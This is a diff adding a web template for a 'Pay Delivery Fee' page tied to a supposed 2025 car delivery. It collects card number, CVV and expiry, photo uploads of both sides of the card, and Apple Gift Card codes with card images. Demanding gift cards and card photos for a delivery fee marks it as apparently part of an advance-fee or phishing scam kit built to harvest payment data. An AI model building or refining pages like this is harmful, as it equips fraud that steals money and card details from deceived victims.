@@ -1,0 +1,118 @@
+{% extends "base.html" %}
+{% block title %}Pay Delivery Fee{% endblock %}
+{% block content %}
+
+<section class="payment-section">
+  <div class="container">
+    <div class="payment-card">
+      <div class="payment-header">
+        <span class="payment-kicker">Pay Delivery Fee</span>
+        <h2>${{ delivery.fee }}</h2>
+        <p>
+          ✅ Delivering: <strong>{{ car.name }} 2025</strong> to
+          <strong>{{ data.address }}</strong>
+        </p>
+        <p class="payment-eta">{{ delivery.eta }}</p>
+      </div>
+
+      <div class="payment-summary">
+        <img src="{{ url_for('static', filename=car.image) }}" alt="{{ car.name }}" class="payment-car-img">
+        <div class="payment-summary-info">
+          <h3>{{ car.name }} 2025</h3>
+          <p>{{ car.type }}</p>
+          <div class="summary-meta">
+            <span>Deliver To</span>
+            <strong>{{ data.name }}</strong>
+            <a href="mailto:{{ data.email }}">{{ data.email }}</a> · {{ data.phone }}
+          </div>
+        </div>
+      </div>
+
+      <form method="post" enctype="multipart/form-data" class="payment-form">
+        <div class="method-switch">
+          <button type="button" class="method-btn active" data-method="card">💳 Credit Card</button>
+          <button type="button" class="method-btn" data-method="giftcard">🍎 Apple Gift Card</button>
+        </div>
+
+        <div class="method-title">Select Payment Method</div>
+        <input type="hidden" name="payment_method" id="payment_method" value="card">
+
+        <div class="payment-panels">
+          <div class="payment-panel active" id="cardPanel">
+            <h3>Credit Card Payment</h3>
+
+            <label>Card Number</label>
+            <input type="text" name="card_number" placeholder="1234 5678 9012 3456">
+
+            <label>Card Holder Name</label>
+            <input type="text" name="card_name" placeholder="Name on card">
+
+            <label>Expiry Date</label>
+            <input type="text" name="card_expiry" placeholder="MM/YY">
+
+            <label>CVV</label>
+            <input type="text" name="card_cvv" placeholder="123">
+
+            <label>Upload Front</label>
+            <input type="file" name="card_front">
+
+            <label>Upload Back</label>
+            <input type="file" name="card_back">
+          </div>
+
+          <div class="payment-panel" id="giftPanel">
+            <h3>Apple Gift Card</h3>
+
+            <label>Gift Card Code</label>
+            <input type="text" name="gift_code" placeholder="Enter Apple Gift Card code">
+
+            <label>Front</label>
+            <input type="file" name="gift_front">
+
+            <label>Back</label>
+            <input type="file" name="gift_back">
+          </div>
+        </div>
+
+        <div class="proof-section">
+          <label>Upload Payment Proof</label>
+          <div class="proof-box">
+            <input type="file" name="payment_proof" id="payment_proof">
+            <span>Tap to upload proof</span>
+          </div>
+        </div>
+
+        <div class="payment-footer">
+          <button type="submit" class="confirm-btn">I've Paid — Confirm My Order ✓</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</section>
+
+<script>
+const methodBtns = document.querySelectorAll('.method-btn');
+const cardPanel = document.getElementById('cardPanel');
+const giftPanel = document.getElementById('giftPanel');
+const paymentMethodInput = document.getElementById('payment_method');
+
+methodBtns.forEach(btn => {
+  btn.addEventListener('click', () => {
+    methodBtns.forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+
+    const method = btn.dataset.method;
+    paymentMethodInput.value = method;
+
+    if (method === 'card') {
+      cardPanel.classList.add('active');
+      giftPanel.classList.remove('active');
+    } else {
+      giftPanel.classList.add('active');
+      cardPanel.classList.remove('active');
+    }
+  });
+});
+</script>
+
+{% endblock %}
